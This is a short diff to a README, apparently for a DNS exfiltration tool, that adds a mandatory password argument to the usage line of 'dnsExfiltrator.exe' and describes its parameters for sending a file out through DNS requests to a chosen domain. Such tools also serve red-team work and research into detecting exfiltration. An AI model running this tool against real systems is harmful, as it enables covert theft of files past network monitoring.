@@ -51,7 +51,7 @@ You can use **either** the compiled version **or** the PowerShell wrapper (*whic
 
 1/ Using the C# compiled Windows executable (*which you can find in the `release` directory*):
 ```
-dnsExfiltrator.exe <file> <domainName> [s=DNS_server] [t=throttleTime] [r=requestMaxSize] [l=labelMaxSize]
+dnsExfiltrator.exe <file> <domainName> <password> [s=DNS_server] [t=throttleTime] [r=requestMaxSize] [l=labelMaxSize]
       file:           [MANDATORY] The file name to the file to be exfiltrated.
       domainName:     [MANDATORY] The domain name to use for DNS requests.
       DNS_Server:     [OPTIONNAL] The DNS server name or IP to use for DNS requests. Defaults to the system one.
